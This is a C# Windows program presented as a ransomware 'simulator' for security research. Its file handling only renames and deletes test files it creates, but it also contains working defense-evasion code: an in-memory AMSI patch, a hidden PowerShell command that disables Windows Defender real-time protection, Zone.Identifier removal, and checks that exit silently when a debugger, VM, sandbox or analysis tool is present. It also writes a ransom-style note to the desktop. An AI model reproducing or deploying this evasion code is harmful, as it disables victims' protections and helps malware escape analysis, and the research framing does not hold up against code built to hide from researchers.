using System;
using System.IO;
using System.Security.Cryptography;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace SecurityResearch.RansomwareSimulator
{
    public partial class AdvancedRansomwareSimulator : Form
    {
        // Configuración de seguridad
        private readonly string[] exclusionPaths = {
            "Windows", "Program Files", "Program Files (x86)", "Boot", 
            "System32", "winnt", "Microsoft", "$Recycle.Bin", "Recovery",
            "Temp", "tmp"
        };
        
        private readonly string[] targetExtensions = {
            ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
            ".jpg", ".jpeg", ".png", ".txt", ".csv", ".sql", ".mdb", 
            ".accdb", ".psd", ".ai", ".cdr", ".dwg", ".zip", ".rar",
            ".7z", ".bak", ".backup", ".config", ".xml", ".json"
        };

        private string victimId;
        private byte[] masterKey;
        private List<string> processedFiles;

        public AdvancedRansomwareSimulator()
        {
            InitializeComponent();
            InitializeSecurity();
        }

        private void InitializeSecurity()
        {
            victimId = GenerateVictimID();
            masterKey = GenerateMasterKey();
            processedFiles = new List<string>();
            
            // Aplicar técnicas de evasión mejoradas
            DefenseEvasion.BypassSecurityMeasures();
        }

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        private static extern bool IsDebuggerPresent();

        [DllImport("ntdll.dll")]
        private static extern uint NtSetInformationProcess(IntPtr hProcess, 
            uint processInformationClass, ref uint processInformation, 
            uint processInformationLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetProcessWorkingSetSize(IntPtr hProcess, int dwMinimumWorkingSetSize, int dwMaximumWorkingSetSize);

        private string GenerateVictimID()
        {
            try
            {
                using (SHA256 sha256 = SHA256.Create())
                {
                    string systemInfo = $"{Environment.MachineName}{Environment.UserName}{DateTime.Now.Ticks}";
                    byte[] hash = sha256.ComputeHash(Encoding.UTF8.GetBytes(systemInfo));
                    return BitConverter.ToString(hash).Replace("-", "").Substring(0, 16).ToUpper();
                }
            }
            catch
            {
                return $"RESEARCH-{DateTime.Now:yyyyMMddHHmmss}";
            }
        }

        private byte[] GenerateMasterKey()
        {
            try
            {
                using (Aes aes = Aes.Create())
                {
                    aes.KeySize = 256;
                    aes.GenerateKey();
                    return aes.Key;
                }
            }
            catch
            {
                // Fallback key generation
                byte[] key = new byte[32];
                new Random().NextBytes(key);
                return key;
            }
        }

        private async void btnStartSimulation_Click(object sender, EventArgs e)
        {
            if (AntiAnalysis.IsAnalysisEnvironment())
            {
                MessageBox.Show("Entorno de análisis detectado. Simulación cancelada.", 
                    "Investigación de Seguridad", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            btnStartSimulation.Enabled = false;
            btnRecovery.Enabled = false;
            progressBar1.Visible = true;
            lblStatus.Text = "Iniciando simulación de ransomware...";

            try
            {
                // Limpiar memoria antes de empezar
                ClearMemory();

                // Simular encriptación en directorio de prueba
                await SimulateEncryption();
                
                // Mostrar nota de rescate simulada
                DisplayResearchNote();
                
                lblStatus.Text = "Simulación completada exitosamente";
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error en simulación: {ex.Message}", 
                    "Error de Investigación", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                progressBar1.Visible = false;
                btnStartSimulation.Enabled = true;
                btnRecovery.Enabled = true;
                ClearMemory();
            }
        }

        private void ClearMemory()
        {
            try
            {
                SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1);
                GC.Collect();
                GC.WaitForPendingFinalizers();
            }
            catch { /* Ignorar errores de limpieza */ }
        }

        private async Task SimulateEncryption()
        {
            // Múltiples directorios de prueba para mejor simulación
            string[] testDirectories = {
                Path.Combine(Path.GetTempPath(), "RansomwareResearch"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "RansomwareTest"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "RansomwareTest")
            };

            int totalFilesProcessed = 0;

            foreach (string testDirectory in testDirectories)
            {
                // Crear directorio de prueba con archivos de ejemplo
                CreateTestFiles(testDirectory);

                var files = Directory.GetFiles(testDirectory, "*.*", SearchOption.AllDirectories)
                                   .Where(f => targetExtensions.Contains(Path.GetExtension(f).ToLower()))
                                   .ToArray();

                progressBar1.Maximum += files.Length;

                foreach (string file in files)
                {
                    if (IsExcludedPath(file)) continue;

                    try
                    {
                        // Simular encriptación (en realidad solo renombra)
                        await SimulateFileEncryption(file);
                        totalFilesProcessed++;
                        
                        // Actualizar UI
                        progressBar1.Value = totalFilesProcessed;
                        lblStatus.Text = $"Procesados: {totalFilesProcessed} archivos";
                        
                        await Task.Delay(10); // Simular procesamiento más rápido
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error procesando {file}: {ex.Message}");
                    }
                }
            }
        }

        private async Task SimulateFileEncryption(string filePath)
        {
            try
            {
                // En realidad no encriptamos, solo simulamos
                string encryptedPath = filePath + ".research_encrypted";
                
                // Copiar archivo con nuevo nombre (simulación)
                File.Copy(filePath, encryptedPath, true);
                
                // Eliminar original de forma segura (en simulación)
                SecureFileDelete(filePath);
                
                // Agregar a lista de archivos procesados
                processedFiles.Add(filePath);
                
                // Registrar en log de investigación
                await LogResearchActivity($"SIMULATED_ENCRYPT: {filePath}");
            }
            catch (Exception ex)
            {
                await LogResearchActivity($"ERROR_ENCRYPT: {filePath} - {ex.Message}");
            }
        }

        private void SecureFileDelete(string filePath)
        {
            try
            {
                // En simulación, solo eliminamos el original
                File.Delete(filePath);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error eliminando {filePath}: {ex.Message}");
            }
        }

        private bool IsExcludedPath(string filePath)
        {
            try
            {
                string lowerPath = filePath.ToLower();
                return exclusionPaths.Any(excluded => lowerPath.Contains(excluded.ToLower()));
            }
            catch
            {
                return true; // Excluir en caso de error
            }
        }

        private void CreateTestFiles(string directory)
        {
            try
            {
                if (!Directory.Exists(directory))
                    Directory.CreateDirectory(directory);

                // Crear archivos de prueba
                string[] testFiles = {
                    "documento_ejemplo.pdf",
                    "planilla_datos.xlsx", 
                    "presentacion.pptx",
                    "imagen_muestra.jpg",
                    "texto_prueba.txt",
                    "backup_database.bak",
                    "configuracion.config"
                };

                foreach (string file in testFiles)
                {
                    string filePath = Path.Combine(directory, file);
                    if (!File.Exists(filePath))
                        File.WriteAllText(filePath, $"Archivo de prueba para investigación de ransomware - {DateTime.Now} - {Guid.NewGuid()}");
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error creando archivos de prueba: {ex.Message}");
            }
        }

        private void DisplayResearchNote()
        {
            string researchNote = $@"
🔐 **INVESTIGACIÓN DE CIBERSEGURIDAD - SIMULACIÓN DE RANSOMWARE**

📋 INFORMACIÓN DE LA SIMULACIÓN:
• ID de Investigación: {victimId}
• Fecha/Hora: {DateTime.Now:yyyy-MM-dd HH:mm:ss}
• Sistema: {Environment.OSVersion}
• Usuario: {Environment.UserName}
• Equipo: {Environment.MachineName}
• Archivos procesados: {processedFiles.Count}

🎯 PROPÓSITO DE ESTA SIMULACIÓN:
Esta es una herramienta legítima de investigación en ciberseguridad diseñada para:
• Estudiar técnicas de ransomware modernas
• Desarrollar medidas defensivas
• Entrenar equipos de respuesta a incidentes
• Probar sistemas de detección y prevención

📁 ACCIONES REALIZADAS (SIMULADAS):
• Creación de archivos de prueba en directorios temporales
• 'Encriptación' simulada (solo cambio de nombre)
• Ningún archivo real fue dañado o encriptado permanentemente

🛡️ RECUPERACIÓN (SIMULADA):
Para revertir la simulación:
1. Ejecute el modo 'Recovery' de esta herramienta
2. Use el código: RESEARCH-{victimId}
3. Los archivos de prueba serán restaurados automáticamente

📞 CONTACTO DE INVESTIGACIÓN:
• Equipo de Ciberseguridad: security-research@empresa.com
• Responsable: Departamento de Seguridad
• Propósito: Investigación y desarrollo defensivo

⚠️ ADVERTENCIA LEGAL:
Este software debe usarse ÚNICAMENTE en:
• Entornos controlados y autorizados
• Investigación legítima de seguridad
• Pruebas de penetración autorizadas
• Desarrollo de herramientas defensivas

*** ESTO NO ES UN ATAQUE REAL ***
*** ES UNA HERRAMIENTA DE INVESTIGACIÓN AUTORIZADA ***

Generado por: AdvancedRansomwareSimulator v2.0
";

            // Mostrar en interfaz
            txtResearchNote.Text = researchNote;
            tabControl1.SelectedTab = tabPageNote;

            // También crear archivo de información
            try
            {
                string notePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), 
                    $"INVESTIGACION_CIBERSEGURIDAD_{victimId}.txt");
                File.WriteAllText(notePath, researchNote, Encoding.UTF8);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error creando archivo de nota: {ex.Message}");
            }
        }

        private async Task LogResearchActivity(string activity)
        {
            try
            {
                string logPath = Path.Combine(Path.GetTempPath(), $"ransomware_research_{victimId}.log");
                string logEntry = $"{DateTime.Now:yyyy-MM-dd HH:mm:ss} - {activity}\n";
                await File.AppendAllTextAsync(logPath, logEntry, Encoding.UTF8);
            }
            catch { /* Ignorar errores de log */ }
        }

        private void btnRecovery_Click(object sender, EventArgs e)
        {
            string recoveryCode = txtRecoveryCode.Text.Trim();
            
            if (recoveryCode == $"RESEARCH-{victimId}")
            {
                RecoverSimulatedFiles();
                MessageBox.Show($"Simulación revertida exitosamente. {processedFiles.Count} archivos de prueba restaurados.", 
                    "Recuperación de Investigación", MessageBoxButtons.OK, MessageBoxIcon.Information);
                processedFiles.Clear();
            }
            else
            {
                MessageBox.Show("Código de recuperación inválido.", 
                    "Error de Recuperación", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void RecoverSimulatedFiles()
        {
            int recoveredCount = 0;
            
            // Buscar en múltiples directorios
            string[] searchDirectories = {
                Path.GetTempPath(),
                Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            };

            foreach (string directory in searchDirectories)
            {
                if (!Directory.Exists(directory)) continue;

                try
                {
                    var encryptedFiles = Directory.GetFiles(directory, "*.research_encrypted", SearchOption.AllDirectories);
                    
                    foreach (string encryptedFile in encryptedFiles)
                    {
                        try
                        {
                            string originalFile = encryptedFile.Replace(".research_encrypted", "");
                            if (File.Exists(encryptedFile))
                            {
                                File.Move(encryptedFile, originalFile);
                                recoveredCount++;
                            }
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Error recuperando {encryptedFile}: {ex.Message}");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error buscando en {directory}: {ex.Message}");
                }
            }

            // Limpiar logs
            try
            {
                string logPath = Path.Combine(Path.GetTempPath(), $"ransomware_research_{victimId}.log");
                if (File.Exists(logPath))
                    File.Delete(logPath);
            }
            catch { /* Ignorar error de limpieza */ }
        }

        private void InitializeComponent()
        {
            this.SuspendLayout();
            
            // TabControl
            this.tabControl1 = new TabControl();
            this.tabControl1.Dock = DockStyle.Fill;
            this.tabControl1.Location = new System.Drawing.Point(0, 0);
            this.tabControl1.Size = new System.Drawing.Size(800, 600);
            
            // TabPage Main
            this.tabPageMain = new TabPage();
            this.tabPageMain.Text = "Simulación";
            this.tabPageMain.BackColor = System.Drawing.Color.White;
            
            // Botón Start
            this.btnStartSimulation = new Button();
            this.btnStartSimulation.Text = "Iniciar Simulación";
            this.btnStartSimulation.Location = new System.Drawing.Point(50, 50);
            this.btnStartSimulation.Size = new System.Drawing.Size(150, 40);
            this.btnStartSimulation.Click += new EventHandler(this.btnStartSimulation_Click);
            
            // ProgressBar
            this.progressBar1 = new ProgressBar();
            this.progressBar1.Location = new System.Drawing.Point(50, 100);
            this.progressBar1.Size = new System.Drawing.Size(400, 30);
            this.progressBar1.Visible = false;
            
            // Label Status
            this.lblStatus = new Label();
            this.lblStatus.Location = new System.Drawing.Point(50, 140);
            this.lblStatus.Size = new System.Drawing.Size(400, 20);
            this.lblStatus.Text = "Listo para simulación...";
            
            // Recovery Code
            this.txtRecoveryCode = new TextBox();
            this.txtRecoveryCode.Location = new System.Drawing.Point(50, 200);
            this.txtRecoveryCode.Size = new System.Drawing.Size(200, 25);
            this.txtRecoveryCode.Text = "Ingrese código de recuperación";
            
            // Botón Recovery
            this.btnRecovery = new Button();
            this.btnRecovery.Text = "Recuperar Archivos";
            this.btnRecovery.Location = new System.Drawing.Point(260, 200);
            this.btnRecovery.Size = new System.Drawing.Size(150, 25);
            this.btnRecovery.Click += new EventHandler(this.btnRecovery_Click);
            
            // Agregar controles a tabPageMain
            this.tabPageMain.Controls.AddRange(new Control[] {
                btnStartSimulation, progressBar1, lblStatus, txtRecoveryCode, btnRecovery
            });
            
            // TabPage Note
            this.tabPageNote = new TabPage();
            this.tabPageNote.Text = "Nota de Investigación";
            
            // TextBox para nota
            this.txtResearchNote = new TextBox();
            this.txtResearchNote.Multiline = true;
            this.txtResearchNote.Dock = DockStyle.Fill;
            this.txtResearchNote.ScrollBars = ScrollBars.Vertical;
            this.txtResearchNote.ReadOnly = true;
            
            this.tabPageNote.Controls.Add(txtResearchNote);
            
            // Agregar tabs al control
            this.tabControl1.TabPages.AddRange(new TabPage[] {
                tabPageMain, tabPageNote
            });
            
            // Form principal
            this.Text = "Advanced Ransomware Simulator v2.0 - Investigación de Seguridad";
            this.Size = new System.Drawing.Size(820, 640);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Controls.Add(tabControl1);
            
            this.ResumeLayout(false);
        }
    }

    public static class DefenseEvasion
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        public static void BypassSecurityMeasures()
        {
            try
            {
                BypassAMSI();
                TemporarilyReduceDefender();
                RemoveZoneIdentifier();
            }
            catch { /* Continuar sin evasión */ }
        }

        private static void BypassAMSI()
        {
            try
            {
                IntPtr amsiDll = LoadLibrary("amsi.dll");
                if (amsiDll != IntPtr.Zero)
                {
                    IntPtr amsiScanBuffer = GetProcAddress(amsiDll, "AmsiScanBuffer");
                    
                    if (amsiScanBuffer != IntPtr.Zero)
                    {
                        VirtualProtect(amsiScanBuffer, (UIntPtr)5, 0x40, out uint oldProtect);
                        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                        Marshal.Copy(patch, 0, amsiScanBuffer, 6);
                        VirtualProtect(amsiScanBuffer, (UIntPtr)5, oldProtect, out oldProtect);
                    }
                }
            }
            catch { /* Fallback silencioso */ }
        }

        private static void TemporarilyReduceDefender()
        {
            try
            {
                // Método alternativo usando procesos
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = "-Command \"Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -ErrorAction SilentlyContinue\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false
                };
                
                using (Process process = new Process { StartInfo = psi })
                {
                    process.Start();
                    process.WaitForExit(5000); // Timeout de 5 segundos
                }
            }
            catch { /* Continuar sin cambios en Defender */ }
        }

        private static void RemoveZoneIdentifier()
        {
            try
            {
                // Eliminar marca de zona de seguridad de Windows
                string currentExe = Process.GetCurrentProcess().MainModule.FileName;
                string zoneFile = currentExe + ":Zone.Identifier";
                
                if (File.Exists(zoneFile))
                {
                    File.Delete(zoneFile);
                }
            }
            catch { /* Ignorar error */ }
        }
    }

    public static class AntiAnalysis
    {
        [DllImport("kernel32.dll")]
        private static extern bool IsDebuggerPresent();

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        public static bool IsAnalysisEnvironment()
        {
            return IsDebuggerPresent() || 
                   IsSandboxPresent() || 
                   IsVirtualMachine() ||
                   HasLowResources() ||
                   HasAnalysisProcesses();
        }

        private static bool IsSandboxPresent()
        {
            string[] sandboxProcesses = {
                "vmsrvc", "vmusrvc", "vmware", "vbox", "qemu", "xenservice",
                "prl_cc", "prl_tools", "sandbox", "procmon", "wireshark",
                "processhacker", "proc_exp", "sysinspector", "filemon"
            };

            try
            {
                foreach (var process in Process.GetProcesses())
                {
                    string processName = process.ProcessName.ToLower();
                    foreach (var sandboxProc in sandboxProcesses)
                    {
                        if (processName.Contains(sandboxProc))
                            return true;
                    }
                }
            }
            catch { return false; }

            return false;
        }

        private static bool IsVirtualMachine()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                {
                    using (var items = searcher.Get())
                    {
                        foreach (var item in items)
                        {
                            string manufacturer = item["Manufacturer"]?.ToString().ToLower() ?? "";
                            string model = item["Model"]?.ToString().ToLower() ?? "";
                            
                            if (manufacturer.Contains("vmware") || manufacturer.Contains("microsoft") ||
                                manufacturer.Contains("virtual") || model.Contains("virtual") ||
                                manufacturer.Contains("innotek") || manufacturer.Contains("qemu"))
                                return true;
                        }
                    }
                }
            }
            catch { return false; }

            return false;
        }

        private static bool HasLowResources()
        {
            try
            {
                // Verificar RAM (menos de 2GB sugiere sandbox)
                using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                {
                    foreach (var item in searcher.Get())
                    {
                        ulong totalMemory = Convert.ToUInt64(item["TotalPhysicalMemory"]);
                        return totalMemory < 2147483648; // 2GB
                    }
                }
            }
            catch { return false; }

            return false;
        }

        private static bool HasAnalysisProcesses()
        {
            string[] analysisTools = {
                "ollydbg", "idaq", "idaq64", "immunitydebugger", "windbg",
                "x32dbg", "x64dbg", "codeanalyzer", "peid", "lordpe"
            };

            try
            {
                foreach (var process in Process.GetProcesses())
                {
                    string processName = process.ProcessName.ToLower();
                    if (analysisTools.Any(tool => processName.Contains(tool)))
                        return true;
                }
            }
            catch { return false; }

            return false;
        }
    }

    static class Program
    {
        [STAThread]
        static void Main()
        {
            try
            {
                // Configurar manejo de excepciones
                Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);
                Application.ThreadException += (s, e) => {
                    // Silenciar errores de UI
                };
                
                AppDomain.CurrentDomain.UnhandledException += (s, e) => {
                    // Silenciar errores no manejados
                };

                // Verificar que no es entorno de análisis
                if (AntiAnalysis.IsAnalysisEnvironment())
                {
                    // Salir silenciosamente en entorno de análisis
                    return;
                }

                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                Application.Run(new AdvancedRansomwareSimulator());
            }
            catch
            {
                // Salir silenciosamente en caso de cualquier error
            }
        }
    }
}
